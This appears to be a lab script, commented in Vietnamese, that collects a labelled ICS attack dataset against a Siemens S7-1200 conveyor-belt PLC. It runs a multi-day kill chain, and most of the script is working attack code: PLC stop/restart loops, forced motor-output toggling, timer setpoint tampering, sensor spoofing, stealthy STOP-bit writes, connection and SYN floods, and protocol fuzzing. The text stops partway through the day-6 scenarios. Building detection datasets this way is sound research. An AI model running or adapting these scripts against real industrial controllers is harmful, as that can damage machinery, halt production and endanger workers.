#!/bin/bash
set -euo pipefail

# ================================================================
# run_day_bangtruyen.sh — ICS Attack Dataset Collection (Băng Truyền S7-1200)
# ================================================================
#
# Hệ thống Băng Truyền (Conveyor Belt) — Biến địa chỉ:
#   Đầu vào (Inputs):
#     Start_1         %I0.0   — Nút khởi động băng truyền
#     Stop_1          %I0.1   — Nút dừng băng truyền
#     Cam_bien_phat_hien_thung %I0.2 — Cảm biến phát hiện thùng
#   Đầu ra (Outputs):
#     BangTai         %Q0.0   — Động cơ băng tải (1=Chạy, 0=Dừng)
#   Biến nội (Merker):
#     START           %M5.0   — Cờ khởi động logic
#     STOP            %M5.1   — Cờ dừng logic
#     Times 1         %MD50   — Bộ đếm thời gian tổng (DInt ms)
#     Tag_1           %M5.2   — Trạng thái nội bộ 1
#     Tag_2           %M5.3   — Trạng thái nội bộ 2
#     Vat 1           %M5.4   — Vật thể 1 đang trên băng
#     CD1             %MD54   — Countdown timer 1 (ms)
#     Tag_5           %M5.5   — Trạng thái nội bộ 5
#     Vat 2           %M5.6   — Vật thể 2 đang trên băng
#     Tag_4           %MD56   — Timer nội bộ 4 (ms)
#     CD2             %MD58   — Countdown timer 2 (ms)
#     Tag_6           %M5.7   — Trạng thái nội bộ 6
#     Vat 3           %M6.0   — Vật thể 3 đang trên băng
#     CD3             %MD62   — Countdown timer 3 (ms)
#     S1              %M6.1   — Cờ trạng thái S1
#     Tag_8           %M6.2   — Trạng thái nội bộ 8
#     Nhap            %MW70   — Giá trị đầu vào (Int)
#     HienThi         %MW74   — Giá trị hiển thị (Int)
#
# Kill chain thực tế của kẻ tấn công ICS:
#   Ngày 1: Baseline — 100% benign, thu baseline traffic
#   Ngày 2: Reconnaissance — scan, thu thập thông tin PLC
#   Ngày 3: Initial Impact — CPU STOP + force nguy hiểm (băng tải tắt bất ngờ)
#   Ngày 4: Process Manipulation — setpoint + sensor spoof
#   Ngày 5: Denial of Service — flood + fuzz
#   Ngày 6: Mixed Test Day — kết hợp tất cả kịch bản (Tập Test)
#
# Tham chiếu: MITRE ATT&CK for ICS: T0846, T0861, T0816, T0836, T0856, T0814
#
# Cách chạy:
#   Máy CONTROLLER: bash run_day_bangtruyen.sh --day 1 --role controller \
#                       --target 192.168.210.211 --iface eth0
#   Máy ATTACKER:   bash run_day_bangtruyen.sh --day 3 --role attacker \
#                       --target 192.168.210.211 --iface eth0
# ================================================================

[[ -f testbed.conf ]] && source ./testbed.conf

if [[ -z "${PY_CMD:-}" ]]; then
    command -v python3 &>/dev/null && PY_CMD="python3" || PY_CMD="python"
fi

export PYTHONPATH="."

DAY=""
ROLE=""
TARGET_IP="${TARGET_IP:-192.168.210.211}"
IFACE="${IFACE:-eth0}"
SESSION_ID=""
HOST_ID=""

while [[ $# -gt 0 ]]; do
    case $1 in
        --day)        DAY="$2";        shift 2 ;;
        --role)       ROLE="$2";       shift 2 ;;
        --target)     TARGET_IP="$2";  shift 2 ;;
        --iface)      IFACE="$2";      shift 2 ;;
        --session-id) SESSION_ID="$2"; shift 2 ;;
        --host-id)    HOST_ID="$2";    shift 2 ;;
        *) echo "[ERROR] Unknown: $1"; exit 1 ;;
    esac
done

[[ -z "$DAY" ]]  && { echo "Thieu --day (1-6)";  exit 1; }
[[ -z "$ROLE" ]] && { echo "Thieu --role";        exit 1; }
[[ -z "$SESSION_ID" ]] && SESSION_ID="day${DAY}_bt_s1"
[[ -z "$HOST_ID" ]] && HOST_ID="${ROLE}_host"

mkdir -p "captures/day${DAY}" logs labels

declare -a PIDS=()
cleanup() { for p in "${PIDS[@]:-}"; do kill "$p" 2>/dev/null || true; done; }
trap cleanup EXIT INT TERM

echo "=== run_day_bangtruyen.sh  day=$DAY  role=$ROLE  target=$TARGET_IP ==="

# ── Ghi label CSV ────────────────────────────────────────────────
label() {
    local scenario=$1 action=$2
    local ts; ts=$($PY_CMD -c "import time; print(int(time.time()*1000))")
    local f="labels/day${DAY}_${SESSION_ID}_timeline.csv"
    [[ ! -f "$f" ]] && echo "attacker_timestamp_ms,scenario_label,action,session_id,host_id" > "$f"
    echo "${ts},${scenario},${action},${SESSION_ID},${HOST_ID}" >> "$f"
    echo "[$(date +%H:%M:%S)] >>> $scenario  $action"
}

wait_s() { echo "[wait] $2 -- ${1}s"; sleep "$1"; }

# ── Khôi phục PLC Băng Truyền về trạng thái an toàn sau tấn công ─
restore_plc() {
    echo "[restore] Khoi phuc PLC Bang Truyen..."
    $PY_CMD - <<PYEOF
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
from snap7.util import set_bool, set_int, set_dint
try:
    c = snap7.client.Client()
    c.connect('$TARGET_IP', 0, 1)

    # 1. Reset Q output (Tắt băng tải nếu đang bị ép chạy cưỡng bức)
    try:
        c.write_area(Areas.PA, 0, 0, bytearray([0x00]))
        print('[restore] Reset Q0.0 (BangTai) = 0 (Off)')
    except Exception as e:
        print(f'[restore] Failed to reset Q: {e}')

    # 2. Đọc M area và khôi phục các giá trị về trạng thái vận hành bình thường
    # Byte mapping (MK area từ offset 0):
    #   Byte 5:  M5.0=START, M5.1=STOP, M5.2=Tag1, M5.3=Tag2, M5.4=Vat1, M5.5=Tag5, M5.6=Vat2, M5.7=Tag6
    #   Byte 6:  M6.0=Vat3, M6.1=S1, M6.2=Tag8
    #   MD50 (bytes 50-53): Times1 (DInt, ms)
    #   MD54 (bytes 54-57): CD1 (ms)
    #   MD56 (bytes 56-59): Tag_4 (ms)
    #   MD58 (bytes 58-61): CD2 (ms)
    #   MD62 (bytes 62-65): CD3 (ms)
    #   MW70 (bytes 70-71): Nhap (Int)
    #   MW74 (bytes 74-75): HienThi (Int)
    try:
        m = c.read_area(Areas.MK, 0, 0, 80)

        # Khôi phục cờ điều khiển
        set_bool(m, 5, 0, 0)   # M5.0 START = 0
        set_bool(m, 5, 1, 0)   # M5.1 STOP  = 0 (Không kích dừng)
        set_bool(m, 5, 2, 0)   # M5.2 Tag_1 = 0
        set_bool(m, 5, 3, 0)   # M5.3 Tag_2 = 0
        set_bool(m, 5, 4, 0)   # M5.4 Vat1  = 0 (Không giả vật)
        set_bool(m, 5, 5, 0)   # M5.5 Tag_5 = 0
        set_bool(m, 5, 6, 0)   # M5.6 Vat2  = 0 (Không giả vật)
        set_bool(m, 5, 7, 0)   # M5.7 Tag_6 = 0
        set_bool(m, 6, 0, 0)   # M6.0 Vat3  = 0 (Không giả vật)
        set_bool(m, 6, 1, 0)   # M6.1 S1    = 0
        set_bool(m, 6, 2, 0)   # M6.2 Tag_8 = 0

        # Khôi phục setpoint timer về giá trị mặc định hợp lý
        # CD1, CD2, CD3 = 5 giây (thời gian xử lý 1 vật thể bình thường)
        set_dint(m, 54, 5000)   # CD1 = 5000ms
        set_dint(m, 58, 5000)   # CD2 = 5000ms
        set_dint(m, 62, 5000)   # CD3 = 5000ms

        c.write_area(Areas.MK, 0, 0, m)
        print('[restore] M area reset OK')
    except Exception as e:
        print(f'[restore] Failed to reset M area: {e}')

    # 3. Sau khi reset xong, bật lại START để khởi động lại tiến trình
    try:
        m = c.read_area(Areas.MK, 0, 5, 1)
        set_bool(m, 0, 0, 1)   # M5.0 START = 1 (pulse khởi động)
        c.write_area(Areas.MK, 0, 5, m)
        time.sleep(0.5)
        m = c.read_area(Areas.MK, 0, 5, 1)
        set_bool(m, 0, 0, 0)   # M5.0 START = 0 (kết thúc pulse)
        c.write_area(Areas.MK, 0, 5, m)
        print('[restore] START pulse sent -> BangTruyen running again')
    except Exception as e:
        print(f'[restore] Failed to send START pulse: {e}')

    c.disconnect()
    print('[restore] OK')
except Exception as e:
    print(f'[restore] General error: {e}')
PYEOF
    sleep 2
}

# ================================================================
# CONTROLLER — tshark + log_tags + HMI benign
# ================================================================
run_controller() {
    local pcap="captures/day${DAY}/${SESSION_ID}_controller.pcapng"
    tshark -n -i "$IFACE" -f "host $TARGET_IP" -w "$pcap" -q \
        -o "tls.desegment_ssl_records:FALSE" \
        -o "tls.desegment_ssl_application_data:FALSE" &
    PIDS+=("$!"); echo "[ctrl] tshark -> $pcap"

    $PY_CMD log_tags_bangtruyen.py \
        --target "$TARGET_IP" --interval 0.5 \
        --output "logs/day${DAY}_${SESSION_ID}_tags.csv" &
    PIDS+=("$!"); echo "[ctrl] log_tags started"

    # HMI benign: SCADA đọc trạng thái băng truyền mỗi 1-2s (vận hành bình thường)
    # Và tự động bật lại băng tải nếu phát hiện nó dừng bất thường (không có lệnh STOP)
    $PY_CMD -c "
import snap7, time, random
try:    from snap7.type import Areas
except: from snap7.types import Areas
from snap7.util import get_bool, set_bool
c = snap7.client.Client()
just_reconnected = False
print('[HMI] SCADA polling Băng Truyền started', flush=True)
while True:
    try:
        if not c.get_connected():
            c.connect('$TARGET_IP', 0, 1)
            just_reconnected = True
            print('[HMI] Reconnected to PLC', flush=True)

        # Đọc trạng thái băng tải và cảm biến (giống HMI thật)
        m = c.read_area(Areas.MK, 0, 0, 80)
        q = c.read_area(Areas.PA, 0, 0, 1)
        c.read_area(Areas.PE, 0, 0, 1)

        bang_tai = (q[0] >> 0) & 1
        stop_f   = (m[5] >> 1) & 1

        # Nếu vừa reconnect hoặc băng tải đang tắt mà không có lệnh STOP
        # → Operator HMI sẽ nhấn Start lại để băng tải tiếp tục chạy
        if just_reconnected or (bang_tai == 0 and stop_f == 0):
            print(f'[HMI] BangTai=0, STOP=0 → Sending START pulse to resume belt...', flush=True)
            m5 = c.read_area(Areas.MK, 0, 5, 1)
            set_bool(m5, 0, 0, 1)   # M5.0 START = 1
            c.write_area(Areas.MK, 0, 5, m5)
            time.sleep(0.3)
            set_bool(m5, 0, 0, 0)   # M5.0 START = 0 (kết thúc pulse)
            c.write_area(Areas.MK, 0, 5, m5)
            print('[HMI] START pulse sent → Belt should be running', flush=True)
            just_reconnected = False

        time.sleep(random.uniform(1.0, 2.0))
    except Exception as e:
        print(f'[HMI] Error: {e}', flush=True)
        just_reconnected = True
        time.sleep(2)
" &
    PIDS+=("$!"); echo "[ctrl] HMI benign started (with auto-restart)"

    label "BENIGN_NORMAL" "START"
    wait_s 14400 "Controller running 4h"
    label "BENIGN_NORMAL" "END"
}

# ================================================================
# ATTACKER — Kill chain thực tế (Băng Truyền)
# ================================================================
run_attacker() {
    local pcap="captures/day${DAY}/${SESSION_ID}_attacker.pcapng"
    tshark -n -i "$IFACE" -f "host $TARGET_IP" -w "$pcap" -q \
        -o "tls.desegment_ssl_records:FALSE" \
        -o "tls.desegment_ssl_application_data:FALSE" &
    PIDS+=("$!"); echo "[att] tshark -> $pcap"

    # ── Ngày 1: IDLE (Baseline) ───────────────────────────────────
    if [[ "$DAY" == "1" ]]; then
        label "BENIGN_NORMAL" "START"
        wait_s 14400 "Day 1 attacker idle"
        label "BENIGN_NORMAL" "END"

    # ── Ngày 2: Reconnaissance ───────────────────────────────────
    # Kẻ tấn công trinh sát mạng ICS băng truyền:
    #   1. Scan port 102 tìm PLC
    #   2. Đọc M area, Q area liên tục để hiểu timing băng tải,
    #      chu kỳ xử lý thùng, thời gian countdown CD1/CD2/CD3
    elif [[ "$DAY" == "2" ]]; then
        label "BENIGN_NORMAL" "START"; wait_s 1800 "warmup"; label "BENIGN_NORMAL" "END"

        # 1. SCAN_PORT (10m) — Quét dò PLC qua port 102
        label "SCAN_PORT" "START"
        (
            while true; do
                $PY_CMD -m s7pwn scan "$TARGET_IP/32" --protocols s7 --auto >/dev/null 2>&1 || true
                sleep 55
            done
        ) &
        NP=$!; PIDS+=("$NP")
        wait_s 600 "SCAN_PORT"
        kill "$NP" 2>/dev/null || true
        label "SCAN_PORT" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 2. ENUM_TAGS (20m) — Đọc liên tục để hiểu logic băng truyền
        # Kẻ tấn công cần biết: chu kỳ CD1/CD2/CD3, khi nào Vat1/2/3 được set,
        # địa chỉ Q0.0 (BangTai) và M5.1 (STOP flag)
        label "ENUM_TAGS" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
from snap7.util import get_bool, get_int, get_dint
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)

try:
    info = c.get_cpu_info()
    print(f'[ENUM] CPU: {info.ModuleTypeName}', flush=True)
except Exception as e:
    print(f'[ENUM] Info: {e}')

n = 0
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        m = c.read_area(Areas.MK, 0, 0, 80)    # Toan bo M area
        q = c.read_area(Areas.PA, 0, 0, 1)     # Q0 = BangTai
        i = c.read_area(Areas.PE, 0, 0, 1)     # I0 = Inputs
        n += 1
        if n % 100 == 0:
            bang_tai = (q[0] >> 0) & 1
            start_f  = (m[5] >> 0) & 1
            stop_f   = (m[5] >> 1) & 1
            vat1     = (m[5] >> 4) & 1
            cd1_ms   = get_dint(m, 54)
            print(f'[ENUM] #{n}: BangTai={bang_tai} START={start_f} STOP={stop_f} Vat1={vat1} CD1={cd1_ms}ms', flush=True)
    except: pass
    time.sleep(0.2)   # 5 Hz — nhanh hơn HMI bình thường
PYEOF
        EP=$!; PIDS+=("$EP")
        wait_s 1200 "ENUM_TAGS"
        kill "$EP" 2>/dev/null || true
        label "ENUM_TAGS" "END"

        label "BENIGN_NORMAL" "START"; wait_s 9000 "cooldown"; label "BENIGN_NORMAL" "END"

    # ── Ngày 3: Initial Impact ───────────────────────────────────
    # Tấn công ban đầu vào hệ thống băng truyền:
    #   1. CPU_STOP — Dừng PLC → băng tải dừng đột ngột giữa chừng
    #   2. RWRITE_BURST — Force Q0.0 = 1/0 liên tục → động cơ bị giật cục
    elif [[ "$DAY" == "3" ]]; then
        label "BENIGN_NORMAL" "START"; wait_s 1800 "warmup"; label "BENIGN_NORMAL" "END"

        # 1. CPU_STOP (15m) — Lệnh dừng PLC phần cứng (nếu PLC hỗ trợ)
        # Hậu quả: BangTai dừng ngay lập tức, thùng hàng bị kẹt giữa băng
        # Feature network: s7_cpu_control_count > 0, PDU type = Job + func STOP
        label "CPU_STOP" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
print('[CPU_STOP] Starting periodic PLC STOP attack on Băng Truyền', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        c.plc_stop()
        n += 1
        print(f'[CPU_STOP] #{n}: PLC STOP sent -> BangTai stopped!', flush=True)
        time.sleep(5)
        try:
            c.plc_hot_start()
            print(f'[CPU_STOP] #{n}: PLC restarted', flush=True)
        except: pass
        time.sleep(10)
    except Exception as e:
        print(f'[CPU_STOP] {e}')
        time.sleep(5)
PYEOF
        CP=$!; PIDS+=("$CP")
        wait_s 900 "CPU_STOP"
        kill "$CP" 2>/dev/null || true
        restore_plc
        label "CPU_STOP" "END"

        label "BENIGN_NORMAL" "START"; wait_s 1800 "recovery"; label "BENIGN_NORMAL" "END"

        # 2. RWRITE_BURST (20m) — Force Q0.0 (BangTai) đóng/mở cưỡng bức
        # Thực tế: biết địa chỉ Q0.0 từ ngày enum, ghi đè Output trực tiếp
        # Hậu quả vật lý: Băng tải đột ngột tắt/bật → động cơ bị hại, thùng trôi ngược
        # Feature: s7_write_count cao, s7_output_write_count > 0
        label "RWRITE_BURST" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
print('[RWRITE] Force Q0.0 (BangTai) ON/OFF alternating = Motor stress!', flush=True)
toggle = True
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        # Ghi đè trực tiếp Q0.0 (BangTai): bật/tắt xen kẽ
        val = bytearray([0x01 if toggle else 0x00])
        c.write_area(Areas.PA, 0, 0, val)
        toggle = not toggle
        n += 1
        if n % 100 == 0:
            print(f'[RWRITE] {n} writes: Q0={"ON" if not toggle else "OFF"}', flush=True)
    except: pass
    time.sleep(0.1)
PYEOF
        RP=$!; PIDS+=("$RP")
        wait_s 1200 "RWRITE_BURST"
        kill "$RP" 2>/dev/null || true
        restore_plc
        label "RWRITE_BURST" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

    # ── Ngày 4: Process Manipulation ─────────────────────────────
    # Tấn công thay đổi logic vận hành của băng truyền:
    #   3. SETPOINT_ATTACK — Thay đổi thời gian Countdown CD1/CD2/CD3
    #      → băng tải dừng quá nhanh/lâu → thùng bị kẹt hoặc chồng lên nhau
    #   4. SENSOR_SPOOF — Giả mạo cảm biến phát hiện thùng (Vat1/2/3)
    #      → PLC tưởng có thùng khi không có (hoặc ngược lại)
    elif [[ "$DAY" == "4" ]]; then
        label "BENIGN_NORMAL" "START"; wait_s 1800 "warmup"; label "BENIGN_NORMAL" "END"

        # 3. SETPOINT_ATTACK (20m) — Thay đổi thời gian xử lý CD1/CD2/CD3
        # Tấn công kiểu Stuxnet: thay đổi setpoint từ từ để khó phát hiện
        # Hậu quả: CD1/CD2/CD3 = 60s (quá dài) → hệ thống tắc nghẽn
        #      hoặc CD1/CD2/CD3 = 100ms (quá ngắn) → thùng chưa qua đã dừng sai
        label "SETPOINT_ATTACK" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
from snap7.util import set_dint
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
print('[SETPOINT] Manipulating Conveyor timers (CD1/CD2/CD3) — Stuxnet-style', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        m = c.read_area(Areas.MK, 0, 0, 80)
        # Đặt thời gian xử lý quá dài: 60 giây (bình thường là 5 giây)
        # → Băng tải dừng quá lâu chờ từng thùng → năng suất giảm 92%
        set_dint(m, 54, 60000)   # CD1 = 60s (thay vì 5s bình thường)
        set_dint(m, 58, 60000)   # CD2 = 60s
        set_dint(m, 62, 60000)   # CD3 = 60s
        # Đặt Times1 không đồng bộ để gây lệch phase
        set_dint(m, 50, 120000)  # Times1 = 120s (kéo dài chu kỳ tổng)
        c.write_area(Areas.MK, 0, 0, m)
        n += 1
        if n % 60 == 0:
            print(f'[SETPOINT] #{n} writes: CD1=CD2=CD3=60s (normal=5s)', flush=True)
    except: pass
    time.sleep(0.5)
PYEOF
        SP=$!; PIDS+=("$SP")
        wait_s 1200 "SETPOINT_ATTACK"
        kill "$SP" 2>/dev/null || true
        restore_plc
        label "SETPOINT_ATTACK" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 4. SENSOR_SPOOF (20m) — Giả mạo cảm biến phát hiện thùng
        # Hậu quả: PLC tưởng luôn có thùng (Vat1=Vat2=Vat3=1) → băng tải không dừng
        # để lấy hàng → thùng chạy qua điểm lấy hàng mà không được xử lý
        label "SENSOR_SPOOF" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
from snap7.util import set_bool
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
print('[SPOOF] Fixing Vat1=Vat2=Vat3=1 (always detected) — hiding real state', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        m = c.read_area(Areas.MK, 0, 5, 2)   # Đọc byte M5 và M6
        # Giả mạo: cả 3 vị trí đều có thùng (cảm biến luôn = 1)
        set_bool(m, 0, 4, 1)   # M5.4 Vat1 = 1
        set_bool(m, 0, 6, 1)   # M5.6 Vat2 = 1
        set_bool(m, 1, 0, 1)   # M6.0 Vat3 = 1
        c.write_area(Areas.MK, 0, 5, m)
        n += 1
        if n % 100 == 0:
            print(f'[SPOOF] #{n} writes: Vat1=Vat2=Vat3=1 (sensors spoofed)', flush=True)
    except: pass
    time.sleep(0.5)
PYEOF
        SS=$!; PIDS+=("$SS")
        wait_s 1200 "SENSOR_SPOOF"
        kill "$SS" 2>/dev/null || true
        restore_plc
        label "SENSOR_SPOOF" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 5. STEALTHY_WRITE (10m) — Tấn công tàng hình, ép dừng băng tải từng chút một
        # Kẻ tấn công ghi STOP bit (M5.1) với tốc độ giống HMI (1 lần/2s)
        # Hậu quả: băng tải dừng định kỳ nhưng không có gói tin bất thường về tốc độ
        # Feature mạng: bình thường hoàn toàn → chỉ Tag (STOP flag) mới phát hiện được
        label "STEALTHY_WRITE" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
from snap7.util import set_bool
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
print('[STEALTHY] Low-and-slow: setting M5.1 (STOP) every 2s', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        m = c.read_area(Areas.MK, 0, 5, 1)
        set_bool(m, 0, 1, 1)   # M5.1 STOP = 1 (ép dừng nhẹ nhàng)
        c.write_area(Areas.MK, 0, 5, m)
        n += 1
        if n % 15 == 0:
            print(f'[STEALTHY] #{n} writes: M5.1=STOP=1', flush=True)
    except: pass
    time.sleep(2)   # 0.5 Hz — y chang tốc độ HMI bình thường
PYEOF
        SW=$!; PIDS+=("$SW")
        wait_s 600 "STEALTHY_WRITE"
        kill "$SW" 2>/dev/null || true
        restore_plc
        label "STEALTHY_WRITE" "END"

        label "BENIGN_NORMAL" "START"; wait_s 4200 "cooldown"; label "BENIGN_NORMAL" "END"

    # ── Ngày 5: Denial of Service ────────────────────────────────
    # Làm quá tải mạng S7, kết nối PLC băng truyền không hoạt động được:
    #   6. S7_FLOOD — Flood connection port 102 (giới hạn S7-1200: 6-8 kết nối)
    #   7. SYN_FLOOD — Flood TCP SYN port 102
    #   8. PROTOCOL_FUZZ — Gửi S7 PDU malformed vào PLC
    elif [[ "$DAY" == "5" ]]; then
        label "BENIGN_NORMAL" "START"; wait_s 1800 "warmup"; label "BENIGN_NORMAL" "END"

        # 6. S7_FLOOD (10m) — Flood connection tới S7 PLC
        label "S7_FLOOD" "START"
        $PY_CMD - <<PYEOF &
import snap7, time, threading
n_ok = 0
n_fail = 0
lock = threading.Lock()
def flood_worker():
    global n_ok, n_fail
    while True:
        try:
            c = snap7.client.Client()
            c.connect('$TARGET_IP', 0, 1)
            time.sleep(0.1)
            c.disconnect()
            with lock:
                n_ok += 1
                if n_ok % 100 == 0:
                    print(f'[FLOOD] {n_ok} connections, {n_fail} fails', flush=True)
        except:
            with lock: n_fail += 1
threads = [threading.Thread(target=flood_worker, daemon=True) for _ in range(8)]
for t in threads: t.start()
print('[FLOOD] 8 threads flooding S7 connections on Băng Truyền PLC', flush=True)
for t in threads: t.join()
PYEOF
        FP=$!; PIDS+=("$FP")
        wait_s 600 "S7_FLOOD"
        kill "$FP" 2>/dev/null || true
        restore_plc
        label "S7_FLOOD" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 7. SYN_FLOOD (10m) — TCP SYN Flood port 102
        label "SYN_FLOOD" "START"
        if command -v hping3 &>/dev/null; then
            hping3 -S -p 102 --flood "$TARGET_IP" >/dev/null 2>&1 &
            SFP=$!; PIDS+=("$SFP")
            echo "[att] hping3 SYN flood started"
        else
            echo "[WARN] hping3 khong co, dung python socket thay"
            $PY_CMD - <<PYEOF &
import socket, threading, time
def syn_worker():
    while True:
        try:
            s = socket.socket()
            s.settimeout(0.05)
            s.connect(('$TARGET_IP', 102))
            s.close()
        except: pass
threads = [threading.Thread(target=syn_worker, daemon=True) for _ in range(30)]
for t in threads: t.start()
print('[SYN] 30 threads flooding port 102 on Băng Truyền PLC', flush=True)
for t in threads: t.join()
PYEOF
            SFP=$!; PIDS+=("$SFP")
        fi
        wait_s 600 "SYN_FLOOD"
        kill "$SFP" 2>/dev/null || true
        restore_plc
        label "SYN_FLOOD" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 8. PROTOCOL_FUZZ (10m) — Gửi S7 PDU sai cấu trúc
        label "PROTOCOL_FUZZ" "START"
        $PY_CMD - <<PYEOF &
import socket, os, time
n = 0
print('[FUZZ] Sending malformed S7 PDUs to port 102 on Băng Truyền', flush=True)
while True:
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect(('$TARGET_IP', 102))
        # TPKT header hợp lệ nhưng S7 payload sai
        tpkt  = b'\x03\x00'
        payload = os.urandom(20)
        length = len(tpkt) + 2 + len(payload)
        pkt = tpkt + length.to_bytes(2, 'big') + payload
        s.send(pkt)
        s.close()
        n += 1
        if n % 50 == 0:
            print(f'[FUZZ] {n} malformed PDUs sent', flush=True)
    except: pass
    time.sleep(0.1)
PYEOF
        FZP=$!; PIDS+=("$FZP")
        wait_s 600 "PROTOCOL_FUZZ"
        kill "$FZP" 2>/dev/null || true
        restore_plc
        label "PROTOCOL_FUZZ" "END"

        label "BENIGN_NORMAL" "START"; wait_s 4200 "cooldown"; label "BENIGN_NORMAL" "END"

    # ── Ngày 6: Mixed Test Day ────────────────────────────────────
    # Kết hợp tất cả kịch bản với thứ tự và thời gian khác nhau
    # Mục tiêu: đánh giá tổng thể model trên dữ liệu chưa từng thấy (Tập Test)
    elif [[ "$DAY" == "6" ]]; then
        label "BENIGN_NORMAL" "START"; wait_s 1800 "warmup"; label "BENIGN_NORMAL" "END"

        # 1. SCAN_PORT (10m)
        label "SCAN_PORT" "START"
        (
            while true; do
                $PY_CMD -m s7pwn scan "$TARGET_IP/32" --protocols s7 --auto >/dev/null 2>&1 || true
                sleep 55
            done
        ) &
        NP=$!; PIDS+=("$NP")
        wait_s 600 "SCAN_PORT"
        kill "$NP" 2>/dev/null || true
        label "SCAN_PORT" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 2. ENUM_TAGS (20m)
        label "ENUM_TAGS" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        m = c.read_area(Areas.MK, 0, 0, 80)
        q = c.read_area(Areas.PA, 0, 0, 1)
        n += 1
        if n % 100 == 0:
            print(f'[ENUM] {n} reads: Q0=0x{q[0]:02X} M5=0x{m[5]:02X}', flush=True)
    except: pass
    time.sleep(0.2)
PYEOF
        EP=$!; PIDS+=("$EP")
        wait_s 1200 "ENUM_TAGS"
        kill "$EP" 2>/dev/null || true
        label "ENUM_TAGS" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 3. CPU_STOP (10m)
        label "CPU_STOP" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
print('[CPU_STOP] Starting periodic PLC STOP attack', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        c.plc_stop()
        n += 1
        print(f'[CPU_STOP] #{n}: PLC STOP sent', flush=True)
        time.sleep(5)
        try:
            c.plc_hot_start()
            print(f'[CPU_STOP] #{n}: PLC restarted', flush=True)
        except: pass
        time.sleep(10)
    except Exception as e:
        print(f'[CPU_STOP] {e}')
        time.sleep(5)
PYEOF
        CP=$!; PIDS+=("$CP")
        wait_s 600 "CPU_STOP"
        kill "$CP" 2>/dev/null || true
        restore_plc
        label "CPU_STOP" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 4. RWRITE_BURST (20m)
        label "RWRITE_BURST" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
toggle = True
print('[RWRITE] Force Q0.0 (BangTai) alternating ON/OFF', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        c.write_area(Areas.PA, 0, 0, bytearray([0x01 if toggle else 0x00]))
        toggle = not toggle
        n += 1
        if n % 100 == 0:
            print(f'[RWRITE] {n} writes', flush=True)
    except: pass
    time.sleep(0.1)
PYEOF
        RP=$!; PIDS+=("$RP")
        wait_s 1200 "RWRITE_BURST"
        kill "$RP" 2>/dev/null || true
        restore_plc
        label "RWRITE_BURST" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 5. SETPOINT_ATTACK (20m)
        label "SETPOINT_ATTACK" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
from snap7.util import set_dint
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
print('[SETPOINT] Manipulating CD1/CD2/CD3 timers', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        m = c.read_area(Areas.MK, 0, 0, 80)
        set_dint(m, 54, 60000)  # CD1 = 60s
        set_dint(m, 58, 60000)  # CD2 = 60s
        set_dint(m, 62, 60000)  # CD3 = 60s
        c.write_area(Areas.MK, 0, 0, m)
        n += 1
        if n % 60 == 0:
            print(f'[SETPOINT] #{n} writes: CD1=CD2=CD3=60s', flush=True)
    except: pass
    time.sleep(0.5)
PYEOF
        SP2=$!; PIDS+=("$SP2")
